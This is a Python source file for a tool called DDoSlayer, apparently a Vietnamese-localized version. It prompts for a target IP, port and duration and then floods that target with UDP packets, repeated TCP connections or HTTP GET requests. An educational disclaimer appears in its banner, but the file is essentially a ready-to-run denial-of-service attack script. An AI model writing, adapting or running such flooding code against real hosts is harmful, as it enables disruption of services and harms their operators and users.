from termcolor import colored
import sys
import os
import time
import socket
import random

# Clear the terminal
os.system("clear")
os.system("figlet DDoSlayer")

print()
print(colored("Tác giả   :  'ViBoss Studio' Dhungx", 'green'))
print(colored("Github    : https://github.com/blackhatethicalhacking", 'red'))
print(colored("YouTube   : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
print(colored("Tấn công là cách phòng thủ tốt nhất!", 'magenta'))
print(colored("Công cụ này được viết cho mục đích giáo dục - giúp đội ngũ phòng thủ hiểu rõ cách thức các cuộc tấn công diễn ra.", 'cyan'))
print(colored("BHEH không chịu trách nhiệm về việc lạm dụng công cụ này và bạn phải ký NDA để thực hiện các cuộc tấn công như vậy", 'red'))
print(colored("Bạn đang sử dụng DDoSlayer Phiên bản: 2.0", 'yellow'))
print()

# Prompt for target IP and port
ip = input("Nhập IP mục tiêu: ")
try:
    port = int(input("Nhập cổng mục tiêu: "))
except ValueError:
    print("Cổng không hợp lệ. Đang thoát...")
    sys.exit()

# Prompt for attack duration
try:
    dur = int(input("Nhập thời gian tấn công (giây): "))
except ValueError:
    print("Thời gian không hợp lệ. Đang thoát...")
    sys.exit()

# Function to perform the UDP Flood attack
def udp_flood(ip, port, message, dur):
    # Create the UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket so that the program doesn't get stuck
    s.settimeout(dur)

    # The IP address and port number of the target host
    target = (ip, port)

    # Start sending packets
    start_time = time.time()
    packet_count = 0
    while True:
        # Send the message to the target host
        try:
            s.sendto(message, target)
            packet_count += 1
            print(f"Đã gửi gói tin {packet_count}")
        except socket.error:
            # If the socket is not able to send the packet, break the loop
            break

        # If the specified duration has passed, break the loop
        if time.time() - start_time >= dur:
            break

    # Close the socket
    s.close()

# Function to perform the SYN Flood attack
def syn_flood(ip, port, duration):
    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sent += 1
            print(f"Gói tin SYN đã gửi: {sent} tới mục tiêu: {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print("\n[*] Đã dừng tấn công.")
            sys.exit()
        finally:
            sock.close()  # Make sure to close the socket in all cases 

# Function to perform the HTTP Flood attack
def http_flood(ip, port, duration):
    # create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # create HTTP request
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"

    sent = 0
    timeout = time.time() + int(duration)

    while True:
        try:
            if time.time() > timeout:
                break
            else:
                pass
            # Re-create the socket for each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(f"Gói tin HTTP đã gửi: {sent} tới mục tiêu: {ip}")
        except KeyboardInterrupt:
            print("\n[-] Đã dừng tấn công bởi người dùng")
            break
    sock.close()


# Prompt for the type of attack
attack_type = input(colored(
    "Chọn loại tấn công (Chọn số) (1.UDP/2.HTTP/3.SYN): ", "green"))

if attack_type == "1":
    message = "Đang gửi gói tin 1337".encode('utf-8')
    print(colored("Đã chọn tấn công UDP", "red"))
    udp_flood(ip, port, message, dur)
    print(colored("Đã hoàn thành tấn công UDP", "red"))
elif attack_type == "3":
    print(colored("Đã chọn tấn công SYN", "red"))
    syn_flood(ip, port, dur)
elif attack_type == "2":
    print(colored("Đã chọn tấn công HTTP", "red"))
    http_flood(ip, port, dur)
else:
    print(colored("Loại tấn công không hợp lệ. Đang thoát...", "green"))
    sys.exit()
